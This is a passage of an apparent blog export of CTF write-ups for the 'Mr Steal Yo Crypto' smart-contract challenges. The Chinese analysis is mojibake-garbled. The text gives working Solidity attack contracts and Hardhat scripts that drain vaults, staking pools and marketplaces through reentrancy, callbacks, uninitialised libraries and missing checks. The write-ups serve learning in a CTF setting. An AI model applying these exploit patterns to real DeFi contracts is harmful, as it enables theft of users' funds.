FlatLaunchpegHackerHepler &#123; constructor(FlatLaunchpeg flatlaunchpeg, uint money,uint startIndex, address attacker) &#123; flatlaunchpeg.publicSaleMint(money); for (uint256 i = 0; i &lt; money; i++) &#123; flatlaunchpeg.transferFrom(address(this), attacker, startIndex+i); console.log(&quot;balance(attacker) = &quot;, flatlaunchpeg.balanceOf(attacker)); &#125; selfdestruct(payable(attacker)); // return some gas &#125;&#125; tsæ–‡ä»¶ä»£ç  123456it(&quot;solves the challenge&quot;, async function () &#123; // implement solution hereawait (await ethers.getContractFactory(&quot;FlatLaunchpegHacker&quot;, attacker)).deploy(flatLaunchpeg.address); &#125;); Challenge 02 - Safu Vault1. question Safu Labs has just released their SafuVault, the safest yield generating vault of all time, or so their twitter account says. Their SafuVault expects deposits of USDC and has already gotten 10,000 USDC from users. You know the drill, drain the funds (at least 90%). You start with 10,000 USDC. 2. analysis è¿™é“é¢˜æˆ‘è§‰å¾—éš¾ï¼Œéš¾åœ¨æˆ‘å¯¹é€’å½’è¿™ä¸€æ•°æ®ç»“æ„å¿˜å¾—å·®ä¸å¤šäº†ï¼Œå¯¼è‡´æˆ‘åœ¨è¿›è¡Œé‡å…¥çš„æ—¶å€™çº ç»“äº†å¤§åŠå¤©ã€‚ è¿™é“é¢˜å¤§è‡´çœ‹äº†ä¸€éä»£ç ï¼Œæœ€å¼€å§‹è§‰å¾—é—®é¢˜è‚¯å®šæ˜¯å‡ºåœ¨shares = (_amount * totalSupply()) / (_pool)ï¼Œè€Œä¸”åˆ†æwithdrawAll()å‡½æ•°å¯ä»¥å‘ç°ï¼Œå¦‚æœå–æ¬¾æ•°ç›®å¤§äºé‡‘åº“çš„ä½™é¢ï¼Œé‡‘åº“çš„åšæ³•æ˜¯å°†é‡Œé¢æ‰€æœ‰çš„é’±å–å‡ºæ¥ï¼Œæ‰€ä»¥çœ‹åˆ°è¿™é‡Œå°±æœ‰äº†ä¸€ç‚¹ç‚¹çœ‰ç›®äº†ï¼Œä½†æ˜¯_burn(msg.sender, _shares)é™åˆ¶äº†å–æ¬¾æ•°é¢æœ€å¤§ä¸º_sharesï¼Œæ‰€ä»¥ç›®æ ‡å°±æ˜¯å°½å¯ä»¥è®©SafuVaultä¸ºè‡ªå·±åˆ›å»ºæ›´å¤šçš„tokensï¼Œå…œå…œè½¬è½¬è¿˜æ˜¯å–å†³äºè¿™è¡Œä»£ç shares = (_amount * totalSupply()) / (_pool)ã€‚ å¦‚æœæ˜¯é€šè¿‡depositæˆ–è€…depositAllå‡½æ•°è¿›è¡Œå­˜æ¬¾çš„è¯ï¼Œæ— è®ºä½ å¦‚ä½•ä¿®æ”¹_poolå’Œ_afterçš„å€¼ï¼Œä½ åªä¼šäºæŸï¼Œè¿™é‡Œè¢«æŠ˜ç£¨äº†ã€‚ã€‚ã€‚ç›´åˆ°æˆ‘çœ‹åˆ°äº†depositForå‡½æ•°ï¼Œè¿™é‡Œçš„tokenä¸ºè‡ªå®šä¹‰ï¼Œæ„å‘³ç€transferFromå¯ä»¥ä¸ºè‡ªå·±æ‰€ç¼–å†™ã€‚è¿™é‡Œæœ‰ç‚¹ç±»ä¼¼é‡å…¥ï¼Œè€Œé‡å…¥æˆ‘ä¸ªäººæ„Ÿè§‰å’Œé€’å½’å¾ˆåƒã€‚å¯ä»¥åœ¨transferFromè°ƒç”¨depositForï¼Œå†è¿›è¡Œè½¬é’±ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶åœ¨æ¯ä¸€æ¬¡é€’å½’è°ƒç”¨çš„æ—¶å€™_poolçš„å€¼å§‹ç»ˆéƒ½æ˜¯10000 etherã€‚è€Œ_afterçš„å€¼æ¯ä¸€æ¬¡éƒ½ä¼šç´¯åŠ _amountï¼Œä»è€Œä½¿å¾—_amountçš„å€¼è¶Šæ¥è¶Šå¤§ï¼ŒtotalSupplyä¹Ÿè·Ÿéšç€è¶Šæ¥è¶Šå¤§ï¼Œ_poolæ’ä¸º10000 etherï¼Œè¿™æ ·å°±å¯ä»¥ä¸ºè‡ªå·±åˆ›å»ºå°½å¯èƒ½å¤šçš„TPä»£å¸ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SafuVault.sol&quot;;import &quot;../other/Token.sol&quot;;import &quot;hardhat/console.sol&quot;;contract SafuVaultHacker &#123; SafuVault safuVault; IStrategy strategy; Token token; // USDC uint counter; constructor(address _safuVault, address _token) &#123; safuVault = SafuVault(_safuVault); strategy = safuVault.strategy(); token = Token(_token); &#125; function attack() public &#123; token.approve(address(safuVault), type(uint).max); safuVault.depositFor(address(this), 1000 ether, address(this)); // the 1000 ether is unuse safuVault.withdrawAll(); token.transfer(msg.sender, token.balanceOf(address(this))); &#125; function transferFrom(address, address, uint256) public &#123; if (counter &lt; 9) &#123; counter++; safuVault.depositFor(address(this), 1000 ether, address(this)); token.transfer(address(safuVault), 1000 ether); &#125; &#125;&#125; tsæ–‡ä»¶ä»£ç  123456789101112it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here // deploy hacker let safuVaultHacker = await (await ethers.getContractFactory(&quot;SafuVaultHacker&quot;, attacker)).deploy(safuVault.address, usdc.address); // tranfer to hacker await usdc.connect(attacker).transfer(safuVaultHacker.address, await usdc.balanceOf(await attacker.getAddress())); // attack await safuVaultHacker.attack();&#125;); Challenge 03 - Game Assets1. question GG labs just released their nOtApOnZi game that allows multiple WLed NFTs to be used as in-game items. To integrate the multiple ERC721 tokens, they have a wrapper contract (ERC1155) that wraps the NFTs, allowing them to be used in-game. Users can also unwrap their NFTs when they are done using them. Your task is to grief users by trapping their NFTs inside the wrapper contract and making them irretrievable 2. analysis èƒ½ä¿®æ”¹GameAsset.balanceOfè¯¥å€¼çš„å‡½æ•°åœ¨åŒ…è£…å™¨ä¸­åªæœ‰setOwnerOperatorå‡½æ•°ï¼Œè€Œåœ¨wrap å’Œ unwrapå‡½æ•°ä¸­éƒ½æœ‰æ¶‰åŠï¼Œæ‰€ä»¥å°±åªèƒ½å¾€è¿™é‡Œæƒ³åŠæ³•ã€‚å…ˆçœ‹wrapä¸­çš„setOwnerOperatorï¼Œè¦æƒ³è°ƒç”¨å®ƒï¼Œå¿…é¡»è¦æ»¡è¶³msg.senderæ˜¯è¯¥ä»£å¸çš„æ‰€æœ‰è€…ï¼Œæˆ–è€…æ˜¯è¢«ä»£å¸æ‰€æœ‰è€…æˆæƒï¼Œæ˜¾ç„¶è¿™è¡Œä¸é€šã€‚å†çœ‹åˆ°unwrapä¸­çš„setOwnerOperatorï¼Œè¦æƒ³æ‰§è¡Œè¯¥å‡½æ•°å¿…é¡»é€šè¿‡_burn(assetOwner, assetId, 1);å³ï¼Œmsg.senderå¿…é¡»æ‹¥æœ‰â€œåŒ…è£…å¸â€ï¼Œè€Œâ€œåŒ…è£…å¸â€é€šè¿‡warpå‡½æ•°å¾—åˆ°ï¼Œå…œå…œè½¬è½¬æœ‰å¾—å›åˆ°wrapä¸­ã€‚ æ¼æ´å‡ºç°åœ¨wrapå‡½æ•°ä¸­ï¼Œrequire(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);è¿™ä¸ªé™åˆ¶æ¡ä»¶å¾ˆå®¹æ˜“é€šè¿‡ï¼Œæ„å‘³ç€_wrap(assetOwner, assetAddress, nftId);å¯ä»¥æˆåŠŸ æ‰§è¡Œï¼Œè‡³äºåé¢é‚£äº›ä»£å¸æ‰€æœ‰æƒçš„åˆ¤æ–­å¯ä»¥å…ˆä¸ç®¡ã€‚ åˆ†æ_wrapä¸­çš„_mintï¼Œåˆ†æ_mintä¸éš¾çœ‹å‡ºï¼Œè¿™ä¸ªé“¸å¸å‡½æ•°å‡ ä¹æ²¡ä»€ä¹ˆç‰¹åˆ«çš„é™åˆ¶ï¼Œå‡½æ•°åŠŸèƒ½å°±æ˜¯ç®€å•çš„ä¸ºtoå£°æ˜ä¸ºæŸtoken id çš„æ‰€æœ‰è€…ã€‚ä½†æ˜¯_doSafeTransferAcceptanceCheckå‡½æ•°å°±æœ‰ç„æœºäº†ï¼Œä»£ç ä¼šå»æ‰§è¡Œtoä¸­çš„onERC1155Receivedå‡½æ•°ï¼Œåªéœ€åœ¨onERC1155Receivedå‡½æ•°ä¸­è°ƒç”¨unwrapå³å¯å®Œæˆã€‚ *å› ä¸ºï¼Œå¦‚æœåœ¨è°ƒç”¨wrapå‡½æ•°çš„æ—¶å€™ï¼Œå°†assetOwnerçš„å€¼è®¾ç½®ä¸ºhackerï¼Œwrapperå°†ä¼šä¸ºhackeré“¸é€ â€œåŒ…è£…å¸â€ï¼Œæ­¤æ—¶é€šè¿‡hackerä¸­çš„onERC1155Received()å‡½æ•°æ‰§è¡Œunwrapå‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸé€šè¿‡_burnå‡½æ•°ï¼Œç„¶åæ‰§è¡Œ_unwrapä¸­çš„setOwnerOperatorï¼Œæ­¤æ—¶hackerä¾¿æ˜¯è¯¥tokençš„ownerã€‚éšåä»£ç ç»§ç»­æ‰§è¡Œwrapæ¥ä¸‹æ¥çš„ä»£ç ï¼Œåˆå› ä¸ºhackeræˆä¸ºäº†ownerï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„æ–­è¨€å¯ä»¥é€šè¿‡ï¼Œæœ€åæ‰§è¡ŒsetOwnerOperator*ï¼Œå°†è¯¥tokençš„æ‰€æœ‰æƒä»hackerç§»äº¤åˆ°wrapä¸­ï¼Œå³å¯æ»¡è¶³é¢˜æ„ã€‚ 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425262728293031323334//SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./AssetWrapper.sol&quot;;import &quot;hardhat/console.sol&quot;;contract AssetWrapperHacker &#123; AssetWrapper wrapper; IGameAsset swordAsset; IGameAsset shieldAsset; address gameAsset; constructor(address _wrapper, address _swordAsset, address _shieldAsset) &#123; wrapper = AssetWrapper(_wrapper); swordAsset = IGameAsset(_swordAsset); shieldAsset = IGameAsset(_shieldAsset); &#125; function attack() public &#123; _attack(swordAsset); _attack(shieldAsset); &#125; function _attack(IGameAsset _gameAsset) internal &#123; gameAsset = address(_gameAsset); wrapper.wrap(0, address(this), gameAsset); &#125; function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4)&#123; wrapper.unwrap(address(this), gameAsset); return this.onERC1155Received.selector; &#125;&#125; tsæ–‡ä»¶ä»£ç  12345678910it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let assetWrapperHacker = await (await ethers.getContractFactory(&quot;AssetWrapperHacker&quot;, attacker)).deploy( assetWrapper.address, swordAsset.address, shieldAsset.address); await assetWrapperHacker.attack();&#125;); Challenge 04 - Free Lunch1. question SafuSwap has just launched their sexy new UniswapV2 fork. It includes a SafuMakerV2 contract which is tasked with converting protocol trading fees to SAFU, its farm token, for later distribution to SAFU stakers. You start with 100 USDC and 100 SAFU, and your task is to increase your balance of both tokens by at least 50x through draining SafuSwapâ€™s funds. 2. analysis è¦ä½¿å¾—attackerçš„ USDCå’ŒSAFUä»£å¸å˜å¾—å¾ˆå¤šï¼Œåªèƒ½é€šè¿‡è·å–Lp(USDC-SAFU)çš„æµåŠ¨æ€§ï¼Œè°ƒç”¨removeLiquidity()å‡½æ•°æ¶ˆé™¤æµåŠ¨æ€§ï¼Œä»è€Œå¢åŠ  è¿™ä¸¤ç§ä»£å¸çš„æ•°é‡ã€‚ è§‚å¯ŸJSæ–‡ä»¶ï¼Œå¯çŸ¥adminäº‹å…ˆå¾€ SafuMakerV2 åˆçº¦è½¬å…¥äº†å¤§é‡çš„ pair token(Lp_usdc_safu)ï¼Œï¼ˆè¿™é‡Œå¯ä»¥çœ‹ä½œæ˜¯æµåŠ¨æ€§ï¼‰ã€‚SafuMakerV2 ä¸­çš„convert()ä½œç”¨æ˜¯å°†ä»»æ„ä»£å¸è½¬ä¸º SAFUä»£å¸ï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬äº†pair token(Lp_usdc_safu)ã€‚ æˆ‘çš„ç›®çš„æ˜¯ï¼š å¾—åˆ°å¤§é‡çš„ Lp(USDC-SAFU)çš„æµåŠ¨æ€§ï¼Œå³ pair token(Lp_usdc_safu) å†é€šè¿‡ç§»é™¤æµåŠ¨æ€§ï¼Œè·å–äº¤æ˜“å¯¹ä¸­çš„ä¸¤ç§ä»£å¸ã€‚ æ”»å‡»æ€è·¯ä¸ºï¼š æ„å»º Lp(Lp(USDC-SAFU)-SAFU)ä»£å¸ï¼Œé€šè¿‡ convert()å‡½æ•°ä¸­çš„pair.burn(address(this))ï¼Œå°†ç§»é™¤(LP USDC-SAFU)-SAFUçš„æµåŠ¨æ€§ï¼Œpairä¼šå°† pair token(Lp_usdc_safu)ä»£å¸å’ŒSAFUå‘é€åˆ° makeråˆçº¦ï¼Œåœ¨æ‰§è¡Œåˆ°_convertStep()å‡½æ•°ï¼Œè¯¥æ­¥éª¤ä¼šå°†makerçš„æ‰€æœ‰pair token(Lp_usdc_safu)ä»£å¸è½¬ç§»åˆ°Lp(Lp(USDC-SAFU)-SAFU)äº¤æ˜“æ± ä¸­ï¼Œè¯¥æ­¥éª¤å®ç°çš„ï¼š**IERC20(fromToken).safeTransfer(address(pair), amountIn);**ï¼Œæ­¤æ—¶Lp(Lp(USDC-SAFU)-SAFU)äº¤æ˜“æ± çš„ä¸¤ç§ä»£å¸æ•°é‡å‘ç”Ÿå¾ˆå¤§å˜åŒ–ï¼Œå³pair token(Lp_usdc_safu)ä»£å¸å¤§é‡å¢åŠ ï¼Œæ­¤æ—¶ç§»é™¤æµåŠ¨æ€§ä¼šå‘ç”Ÿï¼š uint balance0 = IERC20(_token0).balanceOf(address(this)); amount0 = liquidity.mul(balance0) / _totalSupply; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788- balance0çš„å€¼å˜å¤§ï¼Œä»è€Œamountçš„å€¼ä¹Ÿå¢å¤§ï¼Œæ‰€ä»¥ä¼šè·å¾—æ¯”ä¹‹å‰æ›´å¤šçš„pair token(Lp_usdc_safu)ä»£å¸- å†ç„¶ååˆ°Lp(USDC-SAFU)ä¸­ç§»é™¤æµåŠ¨æ€§ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç§»é™¤å¤šçš„æµåŠ¨æ€§ï¼Œå¾—åˆ°æ›´å¤šçš„ USDCå’ŒSAFUã€‚#### 3. solve*æ”»å‡»åˆçº¦*```solidity//SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./SafuMakerV2.sol&quot;;interface IUniswapV2Router02 &#123; function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin,uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity); function removeLiquidity( address tokenA,address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns (uint256 amountA, uint256 amountB); function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline) external; function factory() external view returns(address);&#125;contract SafuMakerV2Exploit &#123; ISafuFactory factory; IUniswapV2Router02 router; SafuMakerV2 maker; IERC20 safu; IERC20 usdc; IERC20 public pair; address public U_Spair; constructor(address _maker, address _router, address _safu, address _usdc, address _pair) &#123; maker = SafuMakerV2(_maker); router = IUniswapV2Router02(_router); factory = maker.factory(); safu = IERC20(_safu); usdc = IERC20(_usdc); pair = IERC20(_pair); &#125; // add the liquidity function pwn1(address hacker) public &#123; usdc.approve(address(router), type(uint256).max); safu.approve(address(router), type(uint256).max); // ä¸ºäº†è·å¾— Lp(usdc-safu)ä»£å¸ router.addLiquidity( address(usdc), address(safu), 80 ether, 80 ether, 0, 0, address(this), block.timestamp ); // create Lp(Lp(usdc-safu), safu) pair.approve(address(router), type(uint256).max); router.addLiquidity( address(pair), address(safu), 10 ether, 10 ether, 0, 0, address(this), block.timestamp ); // ready to convert pair token to safu U_Spair = factory.getPair(address(pair), address(safu)); IERC20(U_Spair).transfer(address(maker), 1 ether); &#125; // remove the liquidity function pwn2() public &#123; IERC20(U_Spair).approve(address(router), type(uint256).max); router.removeLiquidity(address(pair), address(safu), IERC20(U_Spair).balanceOf(address(this)), 0, 0, address(this), block.timestamp); router.removeLiquidity(address(usdc), address(safu), pair.balanceOf(address(this)), 0, 0, msg.sender, block.timestamp); &#125;&#125; tsæ–‡ä»¶ä»£ç  1234567891011121314151617181920212223it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploitFactory = await ethers.getContractFactory(&quot;SafuMakerV2Exploit&quot;); let pairAddress = await safuFactory.getPair(usdc.address,safu.address) let exploit = await exploitFactory.connect(attacker).deploy( safuMaker.address, safuRouter.address, safu.address, usdc.address, pairAddress ); // transfer USDC and SAFU let hacker = await attacker.getAddress(); await usdc.connect(attacker).transfer(exploit.address, await usdc.balanceOf(hacker)); await safu.connect(attacker).transfer(exploit.address, await safu.balanceOf(hacker)); // pwn() await exploit.connect(attacker).pwn1(hacker); let pair = await exploit.pair(); await safuMaker.connect(attacker).convert(pair, safu.address); await exploit.connect(attacker).pwn2(); &#125;); Challenge 05 - Safu Wallet1. question After Safu Labsâ€™ SafuVault product was exploited, they decided to start fresh and venture into the secure web3 tooling space - what could go wrong. Theyâ€™ve launched their first product: a multi-sig wallet, and have already onboarded a user. Your task is to grief that user by trapping their funds inside the wallet. 2. analysis é¢˜ç›®è¦æ±‚å°†é’±åŒ…åˆçº¦ç ´åï¼Œå³æ— æ³•æ­£å¸¸æ‰§è¡Œã€‚ å¯ä»¥çœ‹åˆ°è¿™é‡Œä»£ç†åˆçº¦ï¼Œé€»è¾‘åˆçº¦ä¸º SafuWalletLibraryï¼Œè¦ä½¿å¾—è¿™ä¸ªä»£ç†åˆçº¦æ— æ³•æ‰§è¡Œï¼Œå³å°†ä»£ç†åˆçº¦ä¸­çš„é€»è¾‘åˆçº¦æ¯åå°±å¥½äº†ï¼Œåœ¨é€»è¾‘åˆçº¦ä¸­æœ‰killå‡½æ•°ï¼Œåªè¦æˆåŠŸæ‰§è¡Œè¯¥å‡½æ•°å³å¯ã€‚ä½†æ˜¯ï¼Œå¿…é¡»é€šè¿‡onlymanyownersä¿®é¥°å™¨çš„éªŒè¯ï¼Œè€Œé€šè¿‡éªŒè¯çš„å¿…é¡»æˆä¸ºownerï¼Œå°†é€»è¾‘åˆçº¦ä¸­çš„m_requiredå˜é‡ä¸º0ï¼Œå› ä¸º 0&amp;any&#x3D;&#x3D;0ã€‚çœ‹åˆ°è¿™é‡Œå…¶å®æ˜¯æ²¡åŠæ³•çš„ï¼Œå› ä¸ºåˆå§‹åŒ–åªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯ä»”ç»†çœ‹æˆ‘å‘ç°ï¼Œåœ¨walletåˆå§‹åŒ–çš„æ—¶å€™æ‰§è¡Œçš„æ˜¯delegatecallï¼Œè¿™å°±å¾ˆç¦»è°±äº†ï¼Œè¿™æ ¹æœ¬å°±æ²¡æœ‰åŠ¨ä»»ä½•libraryä¸­çš„æ•°æ®ã€‚æ‰€ä»¥è¯¥åˆçº¦æœªè¢«åˆå§‹åŒ–è¿‡ï¼Œæ‰€ä»¥ä»»ä½•äººå¯ä»¥å°†å…¶åˆå§‹åŒ–ã€‚ 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425//SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface ISafuWalletLibrary &#123; function initWallet(address[] memory _owners, uint _required, uint _daylimit) external; function kill(address) external;&#125;contract SafuWalletExploit &#123; ISafuWalletLibrary library_; constructor() &#123; library_ = ISafuWalletLibrary(0x057ef64E23666F000b34aE31332854aCBd1c8544); &#125; function pwn() public &#123; address[] memory fakeOwners = new address[](1); fakeOwners[0] = address(this); library_.initWallet(fakeOwners, 0, type(uint256).max); library_.kill(msg.sender); &#125;&#125; tsæ–‡ä»¶ä»£ç  1234567it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here m_dailyLimit let exploit = await (await ethers.getContractFactory(&quot;SafuWalletExploit&quot;, attacker)).deploy(); await exploit.pwn();&#125;); Challenge 06 - Tasty Stake1. question [redacted] labs have released their TastyStaking contract, which allows you to stake STEAK in order to farm BUTTER tokens. Your task is to drain all of the STEAK tokens from the staking contract. 2. analysis è¿™é¢˜é¢˜ç›®è¦æ±‚æ˜¯å°† stakingçš„ STEAK ä»£å¸å…¨éƒ¨å·èµ°ã€‚ èƒ½ä»è¯¥ stakingä¸­å–é’±çš„å‡½æ•°åªèƒ½æ˜¯ withdraw() å‡½æ•°ï¼Œè¯¥å‡½æ•°æ²¡å•¥å­é—®é¢˜ï¼Œæœ‰å¤šå°‘ balanceå°±åªèƒ½å–å¤šå°‘ balanceã€‚æ‰€ä»¥éœ€è¦æƒ³åŠæ³•å¦‚ä½•æ˜¯è‡ªå·±æ‰‹ä¸­çš„ balanceå˜å¾—å¾ˆå¤§ã€‚ _applyStake()å‡½æ•°ï¼Œå¯ä»¥ä¿®æ”¹balanceï¼Œåœ¨è°ƒç”¨è¯¥å‡½æ•°çš„å¤–éƒ¨å‡½æ•°ä¸­ï¼ŒmigrateStake()å‡½æ•°åˆ™æ˜¯æœ¬é¢˜æ¼æ´ï¼Œè¯¥å‡½æ•°çš„è°ƒç”¨æ²¡æœ‰é™åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„ä¿®æ”¹è‡ªå·±çš„ balanceè‡³äºTastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);è¿™è¡Œä»£ç ï¼Œå› ä¸º old Stakingæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥åªè¦hackerç®€å•æ‰§è¡Œä¸€ä¸‹å°±å¯ä»¥ä»å…±æ‰§è¡Œäº†ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829//SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./TastyStaking.sol&quot;;contract TastyStakingExploit &#123; TastyStaking staking; IERC20 stakingToken; constructor(address _staking) &#123; staking = TastyStaking(_staking); stakingToken = staking.stakingToken(); &#125; function pwn() public &#123; uint256 stealMoney = stakingToken.balanceOf(address(staking)); // 1. å°† exploit çš„ä½™é¢è®¾ç½®ä¸º 10000 ether staking.migrateStake(address(this), stealMoney); // 2. ç›—å– STEAK staking.withdraw(stealMoney, true); // 3. å°†ç›—å–çš„ STEAKè½¬ç§»åˆ° attacker è´¦æˆ·ä¸­ stakingToken.transfer(msg.sender, stealMoney); &#125; function migrateWithdraw(address staker, uint256 amount) external&#123;&#125;&#125; tsæ–‡ä»¶ä»£ç  1234567it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploit = await (await ethers.getContractFactory(&quot;TastyStakingExploit&quot;, attacker)).deploy(tastyStaking.address); await exploit.connect(attacker).pwn();&#125;); Challenge 07 - Freebie1. question Thereâ€™s a staking contract RewardsAdvisor which accepts FARM tokens and mints an equivalent amount of xFARM. xFARM is used for governance and within [redacted]â€™s defi ecosystem. Your task is to drain 99.99%+ of the FARM tokens from this contract. 2. analysis è¿™é¢˜çš„è¦æ±‚ç›—å– Advisorä¸­ 99.9%+çš„FARMä»£å¸ï¼Œå–é’±çš„å…¥å£æ˜¯ withdrawå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å‡½æ•°ä½“ä¸­çš„æ–­è¨€å¾ˆè‰ç‡ï¼Œéšéšä¾¿ä¾¿å°±å¯ä»¥é€šè¿‡äº†ï¼Œå–é’±çš„éœ€è¦ä»£æ¢ï¼Œå³å–å¤šå°‘çš„ FAMEåˆ™éœ€è¦æ”¯ä»˜å¯¹åº”é‡çš„xFARMï¼Œæ‰€ä»¥æ‰€ä»¥é—®é¢˜è½¬ç§»åˆ°å¦‚ä½•è·å–æ›´å¤šçš„ xFAMEã€‚ çœ‹åˆ°depositå‡½æ•°ï¼Œè§‚å¯Ÿå‡½æ•°ä½“ï¼Œå¯ä»¥çœ‹å‡ºè¿™ä¸ªå‡½æ•°æ¼æ´ç™¾å‡ºï¼Œå¦‚æœ fromæ˜¯åˆçº¦çš„è¯ï¼Œç”šè‡³å¯ä»¥ä¸æ‰§è¡Œfarm.safeTransferFrom(from, address(this), farmDeposit);ï¼Œå¯ä»¥ç›´æ¥ç™½å«–XFAMEï¼Œæ‰€ä»¥å°† fromè®¾ç½®ä¸ºæ”»å‡»åˆçº¦ç®€å•å®ç°delegatedTransferERC20å‡½æ•°å³å¯ã€‚ 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425262728293031323334353637//SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface IRewardsAdvisor &#123; function deposit( uint256 farmDeposit, address payable from, address to ) external returns (uint256 shares); function withdraw( uint256 shares, address to, address payable from ) external returns (uint256 rewards);&#125;contract FreebieExploit &#123; IRewardsAdvisor advisor; address public owner; constructor(address _advisor) &#123; advisor = IRewardsAdvisor(_advisor); owner = address(this); &#125; function pwn() public &#123; advisor.deposit(99999999 ether, payable(address(this)), address(this)); advisor.withdraw(99999999 ether, msg.sender, payable(address(this))); &#125; function delegatedTransferERC20(address token, address to, uint256 amount) external&#123;&#125; receive() external payable &#123;&#125;&#125; tsæ–‡ä»¶ä»£ç  12345678it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploit = await (await ethers.getContractFactory(&quot;FreebieExploit&quot;, attacker)).deploy(rewardsAdvisor.address); await exploit.connect(attacker).pwn();&#125;); Challenge 08 - NFT Bonanza1. question The new NFT exchange contract BonanzaMarketplace has launched, which allows trading for select whitelisted ERC721 and ERC1155 tokens. Your challenge is to swipe all the listed NFTs. 2. analysis è¿™é¢˜è¦æ±‚å°† market ä¸Šæ¶çš„ä¸¤ç§ NFTA å’Œ NFTBä¹°ä¸‹ï¼Œä½†æ˜¯æˆ‘çš„ TOKEN ä»£å¸ä¸º0ã€‚ åˆ†æbuyItem()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å®ç°çš„æ˜¯è´­ä¹° NFTï¼Œæ”¯ä»˜è´¹ç”¨çš„è®¡ç®—å¼ä¸ºï¼š 12uint256 totalPrice = _pricePerItem * _quantity;uint256 feeAmount = totalPrice * fee / BASIS_POINTS; é—®é¢˜åœ¨äº _quantityï¼Œçœ‹åˆ°require(listedItem.quantity &gt;= _quantity, &quot;not enough quantity&quot;);åªè¦æ±‚ä¼ å…¥çš„æ•°é‡å°äº1ï¼Œç„¶åå°±å°†NTFè½¬ç§»åˆ°æˆ‘çš„è´¦æˆ·ä¸‹ã€‚å¦‚æœ _quantityçš„å€¼æ˜¯0ï¼Œé‚£ä¹Ÿå¯ä»¥é€šè¿‡æ–­è¨€ï¼Œä¸”å¾…æ”¯ä»˜çš„è´¹ç”¨ä¸º0ã€‚ 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IERC721 &#123; function safeTransferFrom(address from, address to, uint256 tokenId) external;&#125;interface IBonanzaMarketplace &#123; function buyItem(address _nftAddress, uint256 _tokenId, address _owner, uint256 _quantity)external;&#125;contract NFTBonanzaExploit &#123; IBonanzaMarketplace market; IERC721 NFTA; IERC721 NFTB; address adminUser; constructor(address _market, address _nfta, address _nftb, address _adminUser) &#123; market = IBonanzaMarketplace(_market); NFTA = IERC721(_nfta); NFTB = IERC721(_nftb); adminUser = _adminUser; &#125; function pwn() public &#123; market.buyItem(address(NFTA), 0, adminUser, 0); market.buyItem(address(NFTB), 0, adminUser, 0); NFTA.safeTransferFrom(address(this), msg.sender, 0); NFTB.safeTransferFrom(address(this), msg.sender, 0); &#125; function onERC721Received(address a,address from,uint tokenId,bytes memory data) public returns (bytes4 retval) &#123; return this.onERC721Received.selector; &#125;&#125; tsæ–‡ä»¶ä»£ç  123456789it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploit = await (await ethers.getContractFactory(&quot;NFTBonanzaExploit&quot;, attacker)).deploy( bonanzaMarketplace.address, nftA.address, nftB.address, await adminUser.getAddress() ); await exploit.connect(attacker).pwn();&#125;); Challenge 09 - Inflationary Net Worth1. question Thereâ€™s a MasterChef contract which accepts MULA tokens and mints MUNY as rewards to stakers. MULA has a deflationary transfer tax mechanism which burns 5% of each transfer, in order to properly incentivize long term holders. Your task is to trick MasterChef into minting you all of the MUNY allocated to all stakers. You start with 10,000 MULA. 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js Challenge 0 -1. question 2. analysis 3. solveæ”»å‡»åˆçº¦ 12345```*tsæ–‡ä»¶ä»£ç *```js","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Mr Steal Yo Crypto","slug":"CTFS/Mr-Steal-Yo-Crypto","permalink":"https://biyouqiuqiu.com/categories/CTFS/Mr-Steal-Yo-Crypto/"}],"tags":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/tags/CTFS/"}]},{"title":"foundry_using","slug":"Utils/Foundry/foundry_using","date":"2023-09-07T05:47:10.000Z","updated":"2023-09-07T05:47:10.000Z","comments":true,"path":"2023/09/07/Utils/Foundry/foundry_using/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/07/Utils/Foundry/foundry_using/","excerpt":"","text":"å¼•è¨€å®˜æ–¹æ–‡æ¡£ ä¸‹è½½å®‰è£…(Windowsç‰ˆ) ğŸ“Œ å°æ’æ›² 